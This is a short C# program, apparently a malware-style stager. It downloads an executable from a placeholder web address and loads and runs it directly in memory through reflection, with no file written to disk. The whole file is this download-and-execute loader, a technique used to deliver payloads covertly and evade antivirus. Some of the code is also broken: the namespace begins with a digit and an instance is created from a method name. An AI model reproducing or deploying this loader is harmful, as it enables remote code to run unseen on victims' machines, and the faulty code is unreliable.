using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Reflection;

namespace 3layer
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] result = new WebClient().DownloadData("https://yourwebsite.com/embed.exe");
            run_from_bytes(result, args);
        }

        private static void run_from_bytes(byte[] bytes, string[] args)
        {
            Assembly exe = Assembly.Load(bytes);
            var ep = exe.EntryPoint;
            var pm = exe.CreateInstance(ep.Name);
            ep.Invoke(null, new object[] { args.Skip(1).ToArray<string>() });
        }
    }
}
